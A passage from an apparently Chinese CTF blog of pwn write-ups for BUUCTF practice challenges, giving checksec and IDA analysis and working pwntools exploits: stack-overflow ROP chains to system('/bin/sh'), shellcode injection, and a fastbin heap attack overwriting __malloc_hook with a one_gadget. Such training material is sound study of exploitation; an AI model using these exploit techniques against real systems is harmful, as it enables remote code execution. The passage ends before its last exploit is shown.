p32(read_addr) + p32(sc_addr) + p32(<span class="number">0</span>) + p32(sc_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本即得shell</p>
<p><img src="https://i.loli.net/2020/09/20/WNngpZqb32UfarH.png" alt="image.png"></p>
<h2 id="0x00E-jarvisoj-level2-ret2text"><a href="#0x00E-jarvisoj-level2-ret2text" class="headerlink" title="0x00E.jarvisoj_level2 - ret2text"></a>0x00E.jarvisoj_level2 - ret2text</h2><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/09/21/Fy45LtX2TbDZmCw.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/09/21/udFMIAQECL71B3D.png" alt="image.png"></p>
<p>读入最大0x100字节，但是<code>buf</code>到ebp之间只有0x88字节的空间，存在溢出</p>
<p>同时我们也可以知道该程序中有<code>system()</code>函数可以利用</p>
<p>同时程序中还存在<code>&quot;/bin/sh&quot;</code>字符串</p>
<p><img src="https://i.loli.net/2020/09/21/ODpha1fMLGsxdHN.png" alt="image.png"></p>
<p>故只需要构造rop链执行<code>system(&quot;/bin/sh&quot;)</code>即可getshell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,26276)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">sh_addr = <span class="number">0x804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span> + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可getshell</p>
<p><img src="https://i.loli.net/2020/09/21/1SBivHVUXTmd6rM.png" alt="image.png"></p>
<h2 id="0x00F-HarekazeCTF2019-baby-rop-ret2text-ret2csu"><a href="#0x00F-HarekazeCTF2019-baby-rop-ret2text-ret2csu" class="headerlink" title="0x00F.[HarekazeCTF2019]baby_rop - ret2text + ret2csu"></a>0x00F.[HarekazeCTF2019]baby_rop - ret2text + ret2csu</h2><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/09/21/KLwbUyHQnN3YWTR.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/09/21/ERABfyXm6k1dvZl.png" alt="image.png"></p>
<p>使用<code>scanf(&quot;%s&quot;)</code>读入字符串，存在溢出漏洞</p>
<p><img src="https://i.loli.net/2020/09/21/OSY69XjyadgBbV2.png" alt="image.png"></p>
<p>存在<code>system()</code>函数</p>
<p><img src="https://i.loli.net/2020/09/21/IX7bcApO3V8axJ1.png" alt="image.png"></p>
<p>存在<code>/bin/sh</code>字符串</p>
<p>故考虑使用csu中gadget构造rop链执行<code>system(&quot;/bin/sh&quot;)</code>函数以getshell</p>
<p><img src="https://i.loli.net/2020/09/21/jJeyg9MLalYGnZX.png" alt="image.png"></p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x601048</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27558</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) +  p64(sh_addr) + p64(e.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即得flag</p>
<p><img src="https://i.loli.net/2020/09/21/P4QqLJyplu2xF9r.png" alt="image.png"></p>
<blockquote>
<p>好多一样的题啊Or2</p>
</blockquote>
<h2 id="0x010-bjdctf-2020-babystack-ret2text"><a href="#0x010-bjdctf-2020-babystack-ret2text" class="headerlink" title="0x010.bjdctf_2020_babystack - ret2text"></a>0x010.bjdctf_2020_babystack - ret2text</h2><blockquote>
<p>又是一模一样的题。。。</p>
</blockquote>
<p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/09/21/DQAdo9gNevJrtBz.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/09/21/L5gZjv1rh3bIEt7.png" alt="image.png"></p>
<p>主函数中用户可以控制读入的字符数量，存在溢出</p>
<p>同时存在可以getshell的<code>backdoor()</code>函数</p>
<p><img src="https://i.loli.net/2020/09/21/GMBR1ib9dHNxlPX.png" alt="image.png"></p>
<p>故考虑构造rop链执行<code>backdoor()</code>函数即可</p>
<p>构造exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x4006e6</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25806</span>)<span class="comment">#p = process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可getshell</p>
<p><img src="https://i.loli.net/2020/09/21/nBZbpiVdHPRvu9c.png" alt="image.png"></p>
<h1 id="0x011-0x020"><a href="#0x011-0x020" class="headerlink" title="0x011 ~ 0x020"></a>0x011 ~ 0x020</h1><h2 id="0x011-babyheap-0ctf-2017-Heap-Overflow-Fastbin-Attack-one-gadget"><a href="#0x011-babyheap-0ctf-2017-Heap-Overflow-Fastbin-Attack-one-gadget" class="headerlink" title="0x011.babyheap_0ctf_2017 - Heap Overflow + Fastbin Attack + one_gadget"></a>0x011.babyheap_0ctf_2017 - Heap Overflow + Fastbin Attack + one_gadget</h2><blockquote>
<p>来到BUU后做的第一道堆题</p>
</blockquote>
<p>惯例的<code>checksec</code>，发现<strong>保  护  全  开</strong>（<strong>心 肺 停 止</strong></p>
<p><img src="https://i.loli.net/2020/09/21/aZJExgI4UqDuPoj.png" alt="image.png"></p>
<p>拖入IDA里进行分析（以下部分函数、变量名经过重命名）</p>
<p>常见的堆题基本上都是菜单题，本题也不例外<img src="https://i.loli.net/2020/09/30/VEjFKYhibtqHfs6.png" alt="image.png"></p>
<p>我们可以发现在<code>writeHeap()</code>函数中并没有对我们输入的长度进行检查，<strong>存在堆溢出</strong></p>
<p><img src="https://i.loli.net/2020/09/30/WAOCpdZMVRlSxgm.png" alt="image.png"></p>
<p>故我们考虑先创建几个小堆块，再创建一个大堆块，free掉两个小堆块进入到fastbin，用堆溢出改写fastbin第一个块的fd指针为我们所申请的大堆块的地址，需要注意的是fastbin会对chunk的size进行检查，故我们还需要先通过堆溢出改写大堆块的size，之后将大堆块分配回来后我们就有两个指针指向同一个堆块</p>
<p><img src="https://i.loli.net/2020/10/07/XARM5QmBzFadtWi.png" alt="62DB8B2E56B87418664EEB947A980782.png"></p>
<p>利用堆溢出将大堆块的size重新改大再free以送入unsorted bin，此时大堆块的fd与bk指针指向main_arena+0x58的位置，利用另外一个指向该大堆块的指针输出fd的内容即可得到main_arena+0x58的地址，就可以算出libc的基址</p>
<p><img src="https://i.loli.net/2020/10/07/IBAZ6ChTOrQwonp.png" alt="72934A2F942430E796048F09C96A261F.png"></p>
<p>接下来便是fastbin attack：将某个堆块送入fastbin后改写其fd指针为__malloc_hook的地址（__malloc_hook位于main_arena上方0x10字节处），再将该堆块分配回来，此时fastbin中该链表上就会存在一个我们所伪造的位于__malloc_hook上的堆块，申请这个堆块后我们便可以改写malloc_hook上的内容为后门函数地址，最后随便分配一个堆块便可getshell</p>
<p>考虑到题目中并不存在可以直接getshell的后门函数，故考虑使用one_gadget以getshell</p>
<p><img src="https://i.loli.net/2020/10/07/glLRkSdY3GufeOv.png" alt="D2D612904D8AB28F1DCCE651D4B81508.png"></p>
<p>需要注意的是fastbin存在size检查，故在这里我们选择在__malloc_hook - 0x23的位置构造fake chunk（size字段为0x7f刚好能够通过malloc(0x60)的size检查）</p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27143</span>)<span class="comment">#process(&#x27;./babyheap_0ctf_2017&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index:<span class="built_in">int</span>,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line">    </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#idx1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1, the former idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2, the former idx4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx5, prevent the top chunk combine it</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into unsorted bin, fd points to the main_arena</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into fastbin</span></span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload) <span class="comment">#overwrite fd to fake chunk addr</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx6, our fake chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本即可get shell</p>
<p><img src="https://i.loli.net/2020/10/07/9n7EyWL5OC3aIcm.png" alt="image.png"></p>
<blockquote>
<p>fastbin attack中分配到__malloc_hook附近的fake chunk通常都是malloc(0x60)，也就是size &#x3D;&#x3D; 0x71，这是因为在__malloc_hook - 0x23这个地址上fake chunk的SIZE的位置刚好是0x<code>7f</code>，满足了绕过fastbin的size检查的要求</p>
<p><img src="https://i.loli.net/2020/12/03/GBrOqIdPnDluXhb.png" alt="image.png"></p>
<p>需要注意的是在libc2.31版本中这个位置上的数据已经不再是0x7f，故我们需要<code>具体问题具体分析,具体版本具体调试</code></p>
<p><img src="https://i.loli.net/2021/02/09/uqTerVoWkSvXM3E.png"></p>
</blockquote>
<h2 id="0x012-ciscn-2019-n-5-ret2shellcode"><a href="#0x012-ciscn-2019-n-5-ret2shellcode" class="headerlink" title="0x012.ciscn_2019_n_5 - ret2shellcode"></a>0x012.ciscn_2019_n_5 - ret2shellcode</h2><p>惯例的<code>checksec</code>，发现近乎保护全关，整挺好</p>
<p><img src="https://i.loli.net/2020/10/09/6YLBG8h3kfrqEFl.png" alt="9FIY_KOU2UD64__0RB5U66B.png"></p>
<p>拖入IDA进行分析</p>
<p>![41L&#96;5F__UIYNB_H_YE_DEHD.png](<a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/09/zTYkWulo1hyLKvB.png">https://i.loli.net/2020/10/09/zTYkWulo1hyLKvB.png</a>)</p>
<p>一开始先向bss段上的<code>name</code>读入最大<code>0x64</code>字节的内容，之后再使用<code>gets()</code>读入到text上，存在栈溢出</p>
<p>故考虑先向<code>name</code>上写入shellcode再控制程序跳转至<code>name</code>即可</p>
<p>bss段上<code>name</code>的地址为<code>0x601080</code></p>
<p><img src="https://i.loli.net/2020/10/09/Il3iOrAao5phSXm.png" alt="3N50O64P@_TF@5SAT_@__KU.png"></p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(bss_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;,27296)</span></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行，成功getshell</p>
<p><img src="https://i.loli.net/2020/10/09/kxmOadD1Py7GYLM.png" alt="ZGX5RGFHA_NTT96WDXA__4T.png"></p>
<h2 id="0x013-level2-x64-ret2csu"><a href="#0x013-level2-x64-ret2csu" class="headerlink" title="0x013.level2_x64 - ret2csu"></a>0x013.level2_x64 - ret2csu</h2><p>惯例的<code>checksec</code>，发现只开了NX保护</p>
<p><img src="https://i.loli.net/2020/10/09/wMdhOJgrpDZCicA.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/10/09/cusBMX2AOeT7yEt.png" alt="image.png"></p>
<p>在<code>vulnerable_function()</code>处存在栈溢出，且存在<code>system()</code>函数</p>
<p><img src="https://i.loli.net/2020/10/09/hGbO9NaLnkory3I.png" alt="image.png"></p>
<p>在.data段存在<code>&quot;/bin/sh&quot;</code>字符串</p>
<p>故考虑构造rop链执行<code>system(&quot;/bin/sh&quot;)</code>即可getshell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x600A90</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006B3</span></span><br><span class="line">call_sys = <span class="number">0x400603</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x80</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(call_sys)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level2_x64&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;,26289)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本即得flag</p>
<p><img src="https://i.loli.net/2020/10/09/85mfFgLiZVYXeuN.png" alt="image.png"></p>
<h2 id="0x014-ciscn-2019-ne-5-ret2text"><a href="#0x014-ciscn-2019-ne-5-ret2text" class="headerlink" title="0x014.ciscn_2019_ne_5 - ret2text"></a>0x014.ciscn_2019_ne_5 - ret2text</h2><p>惯例的<code>checksec</code>，发现只开了NX保护</p>
<p><img src="https://i.loli.net/2020/10/09/5Z3rzc8pPb61hjL.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/10/09/aqwxIRMizvbVkPF.png" alt="ZX9_6BVAK5A_V_BL__V_I0X.png"></p>
<p>看起来长得像堆题但其实完全没有堆的操作，还是传统的栈题</p>
<p>在<code>AddLog()</code>函数中读入最大128字节到字符串<code>src</code>中</p>
<p>![UXHLHKU0D9MFLEY3MJK_&#96;QT.png](<a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/09/TREtZOFSvhdqVup.png">https://i.loli.net/2020/10/09/TREtZOFSvhdqVup.png</a>)</p>
<p>在<code>GetFlag()</code>函数中会拷贝<code>src</code>到<code>dest</code>上，存在栈溢出</p>
<p><img src="https://i.loli.net/2020/10/09/FHvp3yewxTmkG6Z.png" alt="_@SVK_64XY_UGE02KN_Q6_9.png"></p>
<p>同时程序中存在<code>system()</code>函数与<code>sh</code>字符串</p>
<p><img src="https://i.loli.net/2020/10/09/q8KI9ocLn1NybWz.png" alt="image.png"></p>
<p>![X0WS9USGGKI&#96;WCZK0_J80_7.png](<a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/09/a7OuQVLPsSAMd85.png">https://i.loli.net/2020/10/09/a7OuQVLPsSAMd85.png</a>)</p>
<p>故直接溢出控制程序执行<code>system(&quot;/bin/sh&quot;)</code>即可</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x80482ea</span></span><br><span class="line">call_sys = <span class="number">0x80486b9</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x48</span> + p32(<span class="number">0xdeadbeef</span>) + p32(call_sys)  + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_ne_5&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;,26005)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可getshell</p>
<p>![L_YGD&#96;OM1C_L_RJ~7__23SD.png](<a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/09/TUIEloeFPhfsXqC.png">https://i.loli.net/2020/10/09/TUIEloeFPhfsXqC.png</a>)</p>
<h2 id="0x015-ciscn-2019-s-3-ret2csu-SROP"><a href="#0x015-ciscn-2019-s-3-ret2csu-SROP" class="headerlink" title="0x015.ciscn_2019_s_3 - ret2csu || SROP"></a>0x015.ciscn_2019_s_3 - ret2csu || SROP</h2><blockquote>
<p> 应<a target="_blank" rel="noopener" href="https://ll1ng.github.io/">某位可爱的女师傅</a>的要求先来做这道题（（（</p>
</blockquote>
<p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/09/13/ip9xYzyfsF8eSvU.png" alt="image.png"></p>
<p>拖入IDA进行分析：<br><img src="https://i.loli.net/2020/09/13/QX6bdK57hjWCyrG.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/09/13/5RsPUNZAyV2ot7f.png" alt="image.png"></p>
<p>可以看到，<code>main()</code>函数会调用<code>vuln()</code>函数，在<code>vuln()</code>函数中会调用两个<strong>系统调用</strong>——0号系统调用<code>sys_read</code>读入最大<strong>0x400</strong>个字节到buf上，buf只分配到了<strong>0x10</strong>个字节的空间，存在栈溢出；随后调用1号系统调用<code>sys_write</code>输出buf上的<strong>0x30</strong>字节的内容</p>
<p>同时我们还可以观察到有一个没有被用到的<code>gadget()</code>函数，里面有两条gadget<strong>将rax设为0xf或0x3b</strong>，也就是15或59</p>
<p><img src="https://i.loli.net/2020/09/13/eBiLZDC9uwRxvIP.png" alt="image.png"></p>
<p>而<code>syscall</code>指令从<strong>rax寄存器</strong>中读取值并调用相对应的系统调用（从程序本身的代码我们也可以看出这一点），对应的我们可以想到的是这个gadget要我们通过相应的<strong>系统调用</strong>来getshell</p>
<p>在64位Linux下，15号系统调用是<strong>rt_sigreturn</strong>，而59号系统调用则是我们所熟悉的<strong>execve</strong>，<del>那么这个系统调用该怎么利用呢我暂且蒙在古里</del></p>
<blockquote>
<p>系统调用一览表见<a target="_blank" rel="noopener" href="https://archive.next.arttnba3.cn/2000/10/12/%E3%80%90%E8%B5%84%E6%96%99%E5%AD%98%E6%A1%A3-0x01%E3%80%91Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%80%E8%A7%88-by-arttnba3/">这里</a></p>
</blockquote>
<p>考虑到在<code>vuln()</code>函数中只分配了<code>0x10</code>个字节的空间给buf，但是后面的系统调用<code>write</code>会输出0x30个字节的内容，即除了我们的输入之外还会打印一些栈上的内容，其中前0x20个字节的内容分别为：0x10字节的buf、8字节的old_rbp（作为返回地址）、8字节的main函数中的<code>call vuln</code>指令的下一条指令的地址，剩下的0x10个字节则是栈上的一些其他的内容</p>
<p>我们使用gdb进行调试看看是什么内容：</p>
<p><img src="https://i.loli.net/2021/04/18/al52jEGe9s3Y1kV.png" alt="image.png"></p>
<p>可以看到<code>0x7ffd56734960</code>上储存的内容即为<code>old_rbp</code>，<code>0x7ffd56734968</code>上储存的内容为main函数中的<code>call vuln</code>指令的下一条指令的地址，而<code>0x7ffd56734970</code>上储存的则是一个<strong>栈上地址</strong></p>
<p>我们很容易计算得出其与下一次读入时与 buf 间的偏移量为<strong>0x7ffd56734a68 - 0x7ffd56734950 &#x3D; 0x118</strong></p>
<p><img src="https://i.loli.net/2021/04/18/SBb3oUqdig8hCtu.png" alt="image.png"></p>
<p>那么我们只需要读取这个值再减去偏移量便可以<strong>得到buf的地址</strong></p>
<h3 id="解法1：ret2csu"><a href="#解法1：ret2csu" class="headerlink" title="解法1：ret2csu"></a>解法1：ret2csu</h3><p>考虑到存在<strong>59号系统调用execve</strong>，故考虑构造rop链通过<code>execve(&quot;/bin/sh&quot;,0,0)</code>以getshell</p>
<p>文件中不存在<code>&quot;/bin/sh&quot;</code>字符串，由于栈基址可知，故考虑手动输入到栈上</p>
<p>这里我们使用csu中的gadget先将r13、r14置为0，之后再<code>mov rdx,r13;mov rsi,r14</code>将rsi和rdx置为0</p>
<p>由于这个gadget运行到后面会执行<code>call [r12 + 8*rbx]</code>（rbx已被置0，故实际效果是执行&#96;&#96;&#96;call [r12]&#96;&#96;），故我们还需要在r12内放入一个存有适合指令的地址的地址，这里由于此前我们已经获得了一个栈上地址，故考虑直接在栈上放一个带有ret的gadget的地址后将r12置为该栈上地址即可继续控制程序执行流，<strong>需要注意的是call指令会往栈上压入当前的下一条指令的地址，我们还需要将之弹出栈</strong></p>
<p>构造exp如下：</p>
